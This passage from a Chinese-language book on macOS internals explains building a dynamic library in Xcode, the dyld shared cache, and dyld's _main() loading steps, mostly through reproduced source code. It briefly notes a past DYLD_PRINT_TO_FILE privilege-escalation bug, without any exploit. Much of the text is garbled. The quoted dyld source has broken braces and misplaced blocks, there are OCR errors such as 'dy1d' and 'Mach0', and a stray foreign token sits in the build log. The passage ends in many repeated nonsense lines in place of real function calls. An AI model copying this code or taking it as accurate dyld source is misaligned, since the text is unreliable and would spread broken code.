/usr/lib/libc++abi.dylib (compatibility version 1.0.0, current version 125.0.0)
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 120.1.0)
/usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1225.0.0)

#### 4.6.1 构建动态库

Xcode环境提供了创建动态库的工程模板，创建动态库的方法比较简单。在Xcode中选择File→New→Project，在打开的工程模板选择对话框中，选择标签macOS→Framework & Library。在右侧选择Library，点击Next按钮。在新页面中输入项目名称mylib，Type选择Dynamic，点击Next按钮选择项目保存的路径，工程就创建好了。接下来修改工程文件内容：

#import <Foundation/Foundation.h>

@interface mylib : NSObject
-(void) hello;
@end

#import "mylib.h"

@implementation mylib
-(void) hello {
    NSLog(@"hello world");
}

@end

保存后点击菜单Product→Build，或者按快捷键command+B键就编译成功了。命令执行完后，就会生成mylib.dylib文件。

Xcode创建的项目是xcodeproj文件，可以使用Xcode提供的工具xcodebuild在命令行下编译。在命令行下切换到工程文件所在的目录，执行xcodebuild会有如下输出：

$ xcodebuild
=== BUILD TARGET mylib OF PROJECT mylib WITH THE DEFAULT CONFIGURATION (Release) ===

##### Check dependencies

Write auxiliary files
write-file
/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/mylib.build/Release/mylib.build
/mylib-own-target-headers.hmap
write-file
/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/mylib.build/Release/mylib.build
/mylib-all-non-framework-target-headers.hmap
/bin/mkdir -p
/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/mylib.build/Release/mylib.build
/Objects-normal/x86_64
write-file
/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/mylib.build/Release/mylib.build
/Objects-normal/x86_64/mylib.LinkFileList

/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang -x
objective-c -arch x86_64 -fmessage-length=94 -fdiagnostics-show-note-include-stack
-fmacro-backtrace-limit=0 -fcolor-diagnostics -std=gnu99 -fobjc-arc -fmodules -gmodules
-fmodules-prune-interval=86400 -fmodules-prune-after=345600
-fbuild-session-file=/var/folders/rd/mts0362j0n92rq0z1cnmdb580000gn/C/org.llvm.clang/ModuleCache/S
ession.modulevalidation -fmodules-validate-once-per-build-session
-Wnon-modular-include-in-framework-module -Werror=non-modular-include-in-framework-module
-Wno-trigraphs -fpascal-strings -Os -fno-common -Wno-missing-field-initializers
-Wno-missing-prototypes -Werror=return-type -Wunreachable-code -Wno-implicit-atomic-properties
-Werror=deprecated-objc-isa-usage -Werror=objc-root-class -Wno-arc-repeated-use-of-weak
-Wduplicate-method-match -Wno-missing-braces -Wparentheses -Wswitch -Wunused-function
-Wno-unused-label -Wno-unused-parameter -Wunused-variable -Wunused-value -Wempty-body
-Wconditional-uninitialized -Wno-unknown-pragmas -Wno-shadow -Wno-four-char-constants
-Wno-conversion -Wconstant-conversion -Wint-conversion -Wbool-conversion -Wenum-conversion
-Wshorten-64-to-32 -Wpointer-sign -Wno-newline-eof -Wno-selector -Wno-strict-selector-match
-Wundeclared-selector -Wno-deprecated-implementations -DNS_BLOCK_ASSERTIONS=1
-DOBJC_OLD_DISPATCH_PROTOTYPES=0 -isysroot
/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.11.sdk
-fasm-blocks -fstrict-aliasing -Wprotocol -Wdeprecated-declarations -mmacosx-version-min=10.11 -g
-Wno-sign-conversion -iquote
/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/mylib.build/Release/mylib.build
/mylib-generated-files.hmap
-I/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/mylib.build/Release/mylib.build
/mylib-own-target-headers.hmap
-I/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/mylib.build/Release/mylib.build
/mylib-all-target-headers.hmap -iquote

/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/mylib.build/Release/mylib.build
/mylib-project-headers.hmap
-I/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/Release/include
-I/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/mylib.build/Release/mylib.build
/DerivedSources/x86_64
-I/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/mylib.build/Release/mylib.build
/DerivedSources -F/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/Release -MMD
-MT dependencies -MF
/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/mylib.build/Release/mylib.build
/Objects-normal/x86_64/mylib.d --வர்/mylib.build/mylib.build/Release/mylib.build
/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/mylib.build/Release/mylib.build
/Objects-normal/x86_64/mylib.dia -c
/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/mylib.m -o
/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/mylib.build/Release/mylib.build
/Objects-normal/x86_64/mylib.o

Ld build/Release/libmylib.dylib normal x86_64
cd /Users/macbook/Documents/macbook/macbook/code/chapter4/mylib
export MACOSX_DEPLOYMENT_TARGET=10.11

/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang -arch x86_64 -dynamiclib -isysroot
/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.11.sdk -L/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/Release
-F/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/Release -filelist
/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/mylib.build/Release/mylib.build
/Objects-normal/x86_64/mylib.LinkFileList -install_name /usr/local/lib/libmylib.dylib
-mmacosx-version-min=10.11 -fobjc-arc -fobjc-link-runtime -single_module -compatibility_version 1
-current_version 1 -Xlinker -dependency_info -Xlinker
/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/mylib.build/Release/mylib.build
/Objects-normal/x86_64/mylib_dependency_info.dat -o
/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/Release/libmylib.dylib

GenerateDSYMFile build/Release/libmylib.dylib.dSYM build/Release/libmylib.dylib
cd /Users/macbook/Documents/macbook/macbook/code/chapter4/mylib

/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/dsymutil
/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/Release/libmylib.dylib -o
/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/Release/libmylib.dylib.dSYM

CodeSign build/Release/libmylib.dylib
cd /Users/macbook/Documents/macbook/macbook/code/chapter4/mylib
export
CODESIGN_ALLOCATE=/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/codesign_allocate

Signing Identity: "-"
/usr/bin/codesign --force --sign --timestamp=none
/Users/macbook/Documents/macbook/macbook/code/chapter4/mylib/build/Release/libmylib.dylib

*** BUILD SUCCEEDED ***

从上面的日志中可以看出，整个编译过程分为：检查依赖（Check dependencies）、生成辅助

文件（Write auxiliary files）、编译（CompileC）、链接（Ld）、生成调试符号（GenerateDSYMFile）、代码签名（CodeSign）6步。

编译代码时使用的编译器是Clang，这是苹果公司开发的用来替代GCC的现代化编译器。目前，该编译器也广泛用于Android、Linux平台。链接时使用Clang前端传入参数给链接器ld，链接完成后dylib动态库就编译成功了。生成调试符号这一步主要用于生成符号的调试信息，供调试器使用。最后一步是代码签名，在没有指定签名证书的情况下，Xcode默认使用adhoc签名。

对于编译好的动态库，其他程序可以通过头文件声明隐式调用，也可以像Linux系统那样，使用系统函数dlopen()、dlsym()手动调用。

#### 4.6.2 dyld

动态库不能直接运行，需要通过系统的动态链接加载器加载到内存后执行。动态链接加载器在系统中以可执行文件形式存在，一般应用程序会在Mach-O文件部分指定一个LC_LOAD_DYLINKER的加载命令。此加载命令指定了dy1d的路径，通常默认值是/usr/lib/dy1d。系统内核在加载Mach-O文件时，会使用该路径指定的程序作为动态库的加载器来加载dy1b。

为了优化程序启动，dyld在加载时启用了共享缓存（shared cache）技术。在进程启动时，共享缓存会被dyld映射到内存中，之后，当Mach-O映像加载时，dyld首先会检查该Mach-O映像与所需的动态库是否在共享缓存中，如果在，则直接将它在共享内存中的内存地址映射到进程的内存地址空间。在程序依赖的系统动态库很多的情况下，这样做会明显提升程序启动性能。

update_dyld_shared_cache程序确保了dyld的共享缓存是最新的，它会扫描/var/db/dyld/shared_region_roots/目录下的paths路径文件，这些paths文件包含了需要加入到共享缓存的Mach-O文件路径列表。update_dyld_shared_cache()会将这些Mach-O文件及其依赖的dylib逐个加到共享缓存中去。

共享缓存是以文件形式存放在/var/db/dyld/目录下的，生成共享缓存的update_dyld_shared_cache程序位于/usr/bin/目录下，该工具会为每种系统架构生成一个缓存文件以及对应的内存地址map表，如下所示：

ls -l /var/db/dyld/
total 1741296
-rw-r--r-- 1 root wheel 333085108 Apr 22 15:02 dyld_shared_cache_i386
-rw-r--r-- 1 root wheel 65378 Apr 22 15:02 dyld_shared_cache_i386.map
-rw-r--r-- 1 root wheel 558259294 Apr 25 16:18 dyld_shared_cache_x86_64h
-rw-r--r-- 1 root wheel 129633 Apr 25 16:18 dyld_shared_cache_x86_64h.map
drwxr-xr-x 10 root wheel 340 Apr 7 09:19 shared_region_roots

可以使用dyld_shared_cache_util工具来查看生成的共享缓存，该工具位于dyld源代码中的launch-cache\dyld_shared_cache_util.cpp文件中，需要手动编译。另外，也可以使用dyld提供的两个函数dyld_shared_cache_extract_dylibs()与dyld_shared_cache_extract_dylibs_progress()解

开cache文件，代码位于dyld源代码的launch-cache\dsc_extractor.cpp文件中。

update_dyld_shared_cache通常只在系统的安装器安装软件与系统更新时调用。当然，可以手动运行sudo update_dyld_shared_cache来更新共享缓存，新的共享缓存会在系统下次启动后自动更新。

#### 4.6.3 动态库的加载

dyld是苹果操作系统的重要组成部分。令人兴奋的是，它是开源的，任何人都可以到苹果官网下载它的源代码 $ ^{①} $，阅读理解它的运作方式，了解系统加载动态库的细节。

系统内核在加载动态库前，会加载dyld，然后调用执行__dyld_start()函数。该函数会执行dyldbootstrap::start()，后者又会执行_main()函数，dyld加载动态库的代码就是从_main()开始执行的。下面以dyld源代码的360.18版本为蓝本进行分析：

uintptr_t
_main(const macho_header* mainExecutableMH, uintptr_t mainExecutableSlide,
int argc, const char* argv[], const char* envp[], const char* apple[],
uintptr_t* startGlue)
{
    // 第一步，设置运行环境，处理环境变量
    uintptr_t result = 0;
    sMainExecutableMachHeader = mainExecutableMH;

    CRSetCrashLogMessage("dyld: launch started");

    setContext(mainExecutableMH, argc, argv, envp, apple);

    sExecPath = _simple_getenv(apple, "executable_path");

    if (!sExecPath) sExecPath = apple[0];

    sExecShortName = ::strrchr(sExecPath, '/');
    if (sExecShortName != NULL)
        ++sExecShortName;
    else
        sExecShortName = sExecPath;
    sProcessIsRestricted = processRestricted(mainExecutableMH, &ignoreEnvironmentVariables, &sProcessRequiresLibraryValidation);
}

if ( sProcessIsRestricted ) {
    if SUPPORT LC DYLD ENVIRONMENT
        checkLoadCommandEnvironmentVariables();
    endif

    pruneEnvironmentVariables(envp, &apple);
    setContext(mainExecutableMH, argc, argv, epvp, apple);
}

else {
    if (!ignoreEnvironmentVariables)
        checkEnvironmentVariables(envp);
    defaultUninitializedFallbackPaths(envp);
}

if ( sEnv.DYLD_PRINT_OPTS )
    printOptions(argv);

if ( sEnv.DYLD_PRINT_ENV )
    printEnvironmentVariables(envp);

getHostInfo(mainExecutableMH, mainExecutableSlide);

••••••

// 第二步，初始化主程序
try {
    addDyldImageToUUIDList();
    CRSetCrashLogMessage(sLoadingCrashMessage);
    sMainExecutable = instantiateFromLoadedImage(mainExecutableMH, mainExecutableSlide, sExecPath);
    gLinkContext.mainExecutable = sMainExecutable;
    gLinkContext.processIsRestricted = sProcessIsRestricted;
    gLinkContext.processRequiresLibraryValidation = sProcessRequiresLibraryValidation;
    gLinkContext.mainExecutableCodeSigned = hasCodeSignatureLoadCommand(mainExecutableMH);

    ••••••

    // 第三步，加载共享缓存
    checkSharedRegionDisable();
    #if DYLD_SHARED_CACHE_SUPPORT
        if ( gLinkContext.sharedRegionMode != ImageLoader::kDontUseSharedRegion )
            mapSharedCache();
    #endif

    #if SUPPORT_VERSIONED_PATHS
        checkVersionedPaths();
    #endif

    // 第四步，加载插入的动态库
    if ( sEnv.DYLD_INSERT_LIBRARIES != NULL ) {
        for (const char* const* lib = sEnv.DYLD_INSERT_LIBRARIES; *lib != NULL; ++lib)
            loadInsertedDylib(*lib);
    }
    sInsertedDylibCount = sAllImages.size() - 1;

    // 第五步，链接主程序
    gLinkContext.linkingMainExecutable = true;
}

link(sMainExecutable, sEnv.DYLD_BIND_AT_LAUNCH, true, ImageLoader::RPathChain(NULL, NULL))
sMainExecutable->setNeverUnloadRecursive();
if ( sMainExecutable->forceFlat() ) {
    gLinkContext.bindFlat = true;
    gLinkContext.prebindUsage = ImageLoader::kUseNoPrebinding;
}

// 第六步，链接插入的动态库
if ( sInsertedDylibCount > 0 ) {
    for (unsigned int i=0; i < sInsertedDylibCount; ++i) {
        ImageLoader* image = sAllImages[i+1];
        link(image, sEnv.DYLD_BIND_AT_LAUNCH, true, ImageLoader::RPathChain(NULL, NULL));
        image->setNeverUnloadRecursive();
    }
    for (unsigned int i=0; i < sInsertedDylibCount; ++i) {
        ImageLoader* image = sAllImages[i+1];
        image->registerInterposing();
    }
}

for (int i=sInsertedDylibCount+1; i < sAllImages.size(); ++i) {
    ImageLoader* image = sAllImages[i];
    if ( image->inSharedCache() ) {
        continue;
        image->registerInterposing();
    }
}

for(int i=0; i < sImageRoots.size(); ++i) {
    sImageRoots[i]->applyInterposing(gLinkContext);
}

// 第七步，执行弱符号绑定
gLinkContext.linkingMainExecutable = false;
sMainExecutable->weakBind(gLinkContext);

// 第八步，执行初始化方法
CRSetCrashLogMessage("dyld: launch, running initializers");
#if SUPPORT_OLD_CRT_INITIALIZATION
    if (!gRunInitializersOldWay)
        initializeMainExecutable();
    #else
        initializeMainExecutable();
    #endif

    // 第九步，查找入口点并返回
    result = (uintptr_t)sMainExecutable->getThreadPC();
    if ( result != 0 ) {
        if ( (gLibSystemHelpers != NULL) && (gLibSystemHelpers->version >= 9) )
            *startGlue = (uintptr_t)gLibSystemHelpers->startGlueToCallExit;
        else
            halt("libdyld.dylib support not present for LC_MAIN");
    }
    else {
        result = (uintptr_t)sMainExecutable->getMain();
    }
}

*startGlue = 0;
}
}
catch(const char* message) {
    syncAllImages();
    halt(message);
}
catch(...) {
    dyld::log("dyld: launch failed\n");
}
CRSetCrashLogMessage(NULL);
return result;
}

整个方法的代码比较长，下面我们按功能分成9个步骤进行讲解。

# 1. 第一步，设置运行环境，处理环境变量

代码在开始时将传入的变量mainExecutableMH赋值给了sMainExecutableMachHeader。这是一个macho_header类型的变量，其结构体内容就是本章前面介绍的mach_header结构体，表示的是当前主程序的Mach-O头部信息。有了头部信息，加载器就可以从头开始遍历整个Mach-O文件的信息。

接着执行了setContext()，此方法设置了一个链接上下文，包括一些回调函数、参数与标志设置信息，代码片段如下所示：

atic void setContext(const macho_header* mainExecutableMH, int argc, const char* argv[], envp[], const char* apple[])

gLinkContext.loadLibrary = &libraryLocator;
gLinkContext.terminationRecorder = &terminationRecorder;
gLinkContext.flatExportFinder = &flatFindExportedSymbol;
gLinkContext.coalescedExportFinder = &findCoalescedExportedSymbol;
gLinkContext.getCoalescedImages = &getCoalescedImages;

gLinkContext.bindingOptions = ImageLoader::kBindingNone;
gLinkContext.argc = argc;
gLinkContext.argv = argv;
gLinkContext.envp = envp;
gLinkContext.apple = apple;
gLinkContext.progname = (argv[0] != NULL) ? basename(argv[0]) : "";
gLinkContext.programVars.mh = mainExecutableMH;
gLinkContext.programVars.NXArgcPtr = &gLinkContext.argc;
gLinkContext.programVars.NXArgvPtr = &gLinkContext.argv;
gLinkContext.programVars.environPtr = &gLinkContext.envp;
gLinkContext.programVars._prognamePtr=&gLinkContext.progname;
gLinkContext.mainExecutable = NULL;
gLinkContext.imageSuffix = NULL;

gLinkContext.dynamicInterposeArray = NULL;
gLinkContext.dynamicInterposeCount = 0;
gLinkContext.prebindUsage = ImageLoader::kUseAllPrebinding;
#if TARGET_IPHONE_SIMULATOR
gLinkContext.sharedRegionMode = ImageLoader::kDontUseSharedRegion;
#else
gLinkContext.sharedRegionMode = ImageLoader::kUseSharedRegion;
#endif

设置的回调函数都是dyld本模块实现的，如loadLibrary方法就是本模块的libraryLocator()方法，负责加载动态库。

设置完这些信息后，执行processRestricted()方法判断进程是否受限。代码如下：

static bool processRestricted(const macho_header* mainExecutableMH, bool* ignoreEnvVars, bool* processRequiresLibraryValidation)
{
    #if TARGET_IPHONE_SIMULATOR
    gLinkContext.codeSigningEnforced = true;
    #else
    uint32_t flags;
    if (csops(0, CS_OPS_STATUS, &flags, sizeof(flags)) != -1) {
        if (flags & CS_REQUIRE_LV)
            *processRequiresLibraryValidation = true;

    #if MAC_OS_X_VERSION_MIN_REQUIRED
    if (flags & CS_ENFORCEMENT) {
        gLinkContext.codeSigningEnforced = true;
    }
    if ((flags & CS_RESTRICT) == CS_RESTRICT) && (csr_check(CSR_ALLOW_TASK_FOR_PID) != 0)) {
        sRestrictedReason = restrictedByEntitlements;
        return true;
    }

    #else
    if ((flags & CS_ENFORCEMENT) && !(flags & CS_GET_TASK_ALLOW)) {
        *ignoreEnvVars = true;
    }
    gLinkContext.codeSigningEnforced = true;

    #endif
}

#endif

if (issetugid()) {
    sRestrictedReason = restrictedBySetGUid;
    return true;
}

if (hasRestrictedSegment(mainExecutableMH)) {
    sRestrictedReason = restrictedBySegment;
    return true;
}

return false;
}

如果进程受限，会有以下3种可能。

restrictedByEntitlements：在macOS系统上，在需要验证代码签名（Gatekeeper开启），且csr_check(CSR_ALLOW_TASK_FOR_PID)返回为true（表示Rootless开启了TASK_FOR_PID标志）时，进程才不会受限。在macOS 10.12系统上，Gatekeeper默认是开启的，并且Rootless是关闭了CSR_ALLOW_TASK_FOR_PID标志位的，这意味着在默认情况下，系统上运行的进程是受限的。

restrictedBySetGuid: 当进程的setuid与setgid位被设置时，进程会被设置成受限。这样做是出于安全考虑，受限后的进程无法访问DYLD开头的环境变量。一种典型的系统攻击就是针对这种情况发生的：在macOS 10.10系统上，一个系统本地提权漏洞就是通过向DYLD_PRINT_TO_FILE环境变量传入拥有SUID权限的受限文件造成的，因为系统没做安全检测，这些文件有直接向系统创建与写入文件的权限。关于漏洞的具体细节可以参看：https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html。

□ restrictedBySegment: 段名受限。当Mach-O包含一个___RESTRICT/___restrict段时，进程会被设置成受限。

在进程受限后，会执行以下3个方法。

checkLoadCommandEnvironmentVariables(): 遍历Mach-O中所有的LC_DYLD_ENVIRONMENT加载命令，然后调用processDyldEnvironmentVariable()对不同的环境变量做相应的处理。

pruneEnvironmentVariables(): 删除进程的LD_LIBRARY_PATH与所有以“DYLD_”开头的环境变量，这样以后创建的子进程就不包含这些环境变量了。

□ setContext(): 重新设置链接上下文。这一步操作主要是由于环境变量发生变化了，需要更新进程的envp与apple参数。

# 2. 第二步，初始化主程序

这一步主要执行了instantiateFromLoadedImage()，它的代码如下：

static ImageLoader* instantiateFromLoadedImage(const macho_header* mh, uintptr_t slide, const char path)
{
    if (isCompatibleMachO((const uint8_t*)mh, path) {
        ImageLoader* image = ImageLoaderMachO::instantiateMainExecutable(mh, slide, path, gLinkContext);
        addImage(image);
        return image;
    }
    throw "main executable not a known format";
}

isCompatibleMach0()主要检查Mach-O的头部的cputype与cpusubtype，从而判断程序与当前的系统是否兼容。如果兼容就调用instantiateMainExecutable()实例化主程序，代码如下：

   </div>

ImageLoader* ImageLoaderMach0::instantiateMainExecutable(const macho_header* mh, uintptr_t slide,

const char* path, const LinkContext& context)
{
    bool compressed;
    unsigned int segCount;
    unsigned int libCount;
    const linkedit_data_command* codeSigCmd;
    const encryption_info_command* encryptCmd;
    sniffLoadCommands(mh, path, false, &compressed, &segCount, &libCount, context, &codeSigCmd, &encryptCmd);
    if (compressed)
        return ImageLoaderMachOCompressed::instantiateMainExecutable(mh, slide, path, segCount, libCount, context);
    else
    #if SUPPORT_CLASSIC_MACHINE
        return ImageLoaderMachOClassic::instantiateMainExecutable(mh, slide, path, segCount, libCount, context);
    #else
        throw "missing LC_DYLD_INFO load command";
#endif
}

sniffLoadCommands()主要获取了加载命令中的如下信息。

□ compressed: 判断Mach-O是Compressed还是Classic类型。判断的依据是Mach-O是否包含LC_DYLD_INFO或LC_DYLD_INFO_ONLY加载命令。这两个加载命令记录了Mach-O的动态库加载信息，使用结构体dyld_info_command表示：

struct dyld_info_command {
    uint32_t cmd;
    uint32_t cmdsize;
    uint32_t rebase_off;
    uint32_t rebase_size;
    uint32_t bind_off;
    uint32_t bind_size;
    uint32_t weak_bind_off;
    uint32_t weak_bind_size;
    uint32_t lazy_bind_off;
    uint32_t lazy_bind_size;
    uint32_t export_off;
    uint32_t export_size;
};

□ rebase_off与rebase_size存储了rebase（重设基址）相关信息。当Mach-O加载到内存中的地址不是指定的首选地址时，就需要对当前的映像数据重设基址。

□ bind_off与bind_size存储了进程的符号绑定信息。当进程启动时，必须绑定这些符号。

典型的有`dyld_stub_binder`，该符号被`dyld`用来做延迟绑定加载符号，一般动态库都包含该符号。

□ weak_bind_off与weak_bind_size存储了进程的弱绑定符号信息。弱符号主要用于面向对象语言中的符号重载，典型的有C++中使用new创建对象，默认情况下会绑定ibstdc++.dylib，如果检测到某个映像使用弱符号引用重载了new符号，dyld会重新绑定该符号并调用重载

的版本。

☐ lazy_bind_off与lazy_bind_size存储了进程的延迟绑定符号信息。有些符号在进程启动时不需要马上解析，它们会在第一次调用时被解析，这类符号叫延迟绑定符号（Lazy Symbol）。

export_off与export_size存储了进程的导出符号绑定信息。导出符号可以被外部的Mach-O访问，通常动态库会导出一个或多个符号供外部使用，而可执行程序又导出_main与_mh_execute_header符号供dyld使用。

segCount：段的数量。sniffLoadCommands()通过遍历所有的LC_SEGMENT_COMMAND加载命令来获取段的数量。

libCount：需要加载的动态库的数量。Mach-O中包含的每一条LC_LOAD_DYLIB、LC_LOAD_WEAK_DYLIB、LC_REEXPORT_DYLIB、LC_LOAD_UPWARD_DYLIB加载命令，都表示需要加载一个动态库。

□ codeSigCmd：通过解析LC_CODE_SIGNATURE来获取代码签名的加载命令。

☐ encryptCmd：通过LC_ENCRYPTION_INFO与LC_ENCRYPTION_INFO_64来获取段加密信息。

获取compressed后，根据Mach-O是否compressed，分别调用ImageLoaderMachOCompressed::instantiateMainExecutable() 与 ImageLoaderMachOClassic::instantiateMainExecutable()。ImageLoaderMachOCompressed::instantiateMainExecutable()代码如下所示：

ImageLoaderMachOCompressed* ImageLoaderMachOCompressed::instantiateMainExecutable(const
    macho_header* mh, uintptr_t slide, const char* path,
    unsigned int segCount, unsigned int libCount, const LinkContext& context)
{
    ImageLoaderMachOCompressed* image = ImageLoaderMachOCompressed::instantiateStart(mh, path,
        segCount, libCount);

    image->setSlide(slide);

    if (slide != 0)
        fgNextPIEDylibAddress = (uintptr_t)image->getEnd();

    image->disableCoverageCheck();
    image->instantiateFinish(context);
    image->setMapped(context);

    if (context.verboseMapping) {
        dyld::log("dyld: Main executable mapped %s\n", path);
        for(unsigned int i=0, e=image->segmentCount(); i < e; ++i) {
            const char* name = image->segName(i);
            if ((strcmp(name, "__PAGEZERO") == 0) || (strcmp(name, "__UNIXSTACK") == 0))
                dyld::log("%18s at 0x%08lX->0x%08lX\n", name, image->segPreferredLoadAddress(i), image->segPreferredLoadAddress(i)+image->segSize(i));
            else
                dyld::log("%18s at 0x%08lX->0x%08lX\n", name, image->segActualLoadAddress(i), image->segActualEndAddress(i));
            }
        }
    }
}

   </div>

return image;
}

ImageLoaderMachOCompressed::instantiateStart() 使用主程序Mach-O信息构造了一个ImageLoaderMachOCompressed对象。disableCoverageCheck() 禁用覆盖率检查。instantiateFinish() 调用parseLoadCmds() 解析其他所有的加载命令，后者会填充完ImageLoaderMachOCompressed的一些保护成员信息，最后调用setDyIdInfo() 设置动态库链接信息，然后调用setSymbolTableInfo() 设置符号表信息。

instantiateFromLoadedImage() 在调用完 ImageLoaderMach0::instantiateMainExecutable() 后，就会调用addImage()，代码如下：

static void addImage(ImageLoader* image)
{
    allImagesLock();
    sAllImages.push_back(image);
    allImagesUnlock();

    uintptr_t lastSegStart = 0;
    uintptr_t lastSegEnd = 0;
    for (unsigned int i = 0, e = image->segmentCount(); i < e; ++i) {
        if (image->segUnaccessible(i))
            continue;
        uintptr_t start = image->segActualLoadAddress(i);
        uintptr_t end = image->segActualEndAddress(i);
        if (start == lastSegEnd) {
            lastSegEnd = end;
        }
        else {
            if (lastSegEnd != 0)
                addMappedRange(image, lastSegStart, lastSegEnd);
                lastSegStart = start;
                lastSegEnd = end;
            }
        }
    }
    if (lastSegEnd != 0)
        addMappedRange(image, lastSegStart, lastSegEnd);

    if (sEnv.DYLD_PRINT_LIBRARIES || (sEnv.DYLD_PRINT_LIBRARIES_POST_LAUNCH &&(sMainExecutable!=NULL) && sMainExecutable->isLinked())){
        dyld::log("dyld: loaded: %s\\n", image->getPath());
    }
}

这段代码将实例化的主程序添加到了全局主列表sAllImages中，最后调用addMappedRange()申请内存，更新主程序映像映射的内存区。做完这些工作，第二步初始化主程序就完成了。

# 3. 第三步，加载共享缓存

这一步主要执行mapSharedCache()来映射共享缓存。该函数先通过_shared_region_check_np()

来检查缓存是否已经映射到了共享区域，如果已经映射，则更新缓存的slide与UUID，然后返回。反之，判断系统是否处于安全启动模式（safe-boot mode），如果是，则删除缓存文件并返回。在正常启动的情况下，调用openSharedCacheFile()打开缓存文件。该函数在sSharedCacheDir路径下，打开与系统当前CPU架构匹配的缓存文件，也就是/var/db/dyld/dyld_shared_cache_x86_64h，接着读取缓存文件的前8192字节，解析缓存头dyld_cache_header的信息，将解析好的缓存信息存入mappings变量，最后调用_shared_region_map_and_slide_np()完成真正的映射工作。部分代码片段如下：

static void mapSharedCache()
{
    uint64_t cacheBaseAddress = 0;
    if ( shared_region_check_np(&cacheBaseAddress) == 0 ) {
        sSharedCache = (dyld_cache_header*)cacheBaseAddress;

        #if x86_64
        const char* magic = (sHaswell ? ARCH_CACHE_MAGIC_H : ARCH_CACHE_MAGIC);

        #else
        const char* magic = ARCH_CACHE_MAGIC;

        #endif

        if ( strcmp(sSharedCache->magic, magic) != 0 ) {
            sSharedCache = NULL;

            if ( gLinkContext.verboseMapping ) {
                dyld::log("dyld: existing shared cached in memory is not compatible\\n");
                return;
            }

        }

        const dyld_cache_header* header = sSharedCache;

        ...

        if ( header->mappingOffset >= 0x68 ) {
            memcpy(dyld::gProcessInfo->sharedCacheUUID, header->uuid, 16);
        }

        ...

    }

    else {
        #if i386 || x86_64
        uint32_t safeBootValue = 0;
        size_t safeBootValueSize = sizeof(safeBootValue);
        if ( (sysctlbyname("kern.safeboot", &safeBootValue, &safeBootValueSize, NULL, 0) == 0) && (safeBootValue != 0 ) {
            struct stat dyldCacheStatInfo;
            if ( my_stat(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME, &dyldCacheStatInfo) == 0 ) {
                struct timeval bootTimeValue;
                size_t bootTimeValueSize = sizeof(bootTimeValue);
                if ( (sysctlbyname("kern.boottime", &bootTimeValue, &bootTimeValueSize, NULL, 0) == 0) && (bootTimeValue.tv_sec != 0 ) {
                    if ( dyldCacheStatInfo.st_mtime < bootTimeValue.tv_sec ) {
                        ::理论与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                        ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
                    ::与(MACOSX_DYLD_SHARED_CACHE_DIR_DYLD_SHARED_CACHE_BASE_NAME_ARCH_NAME);
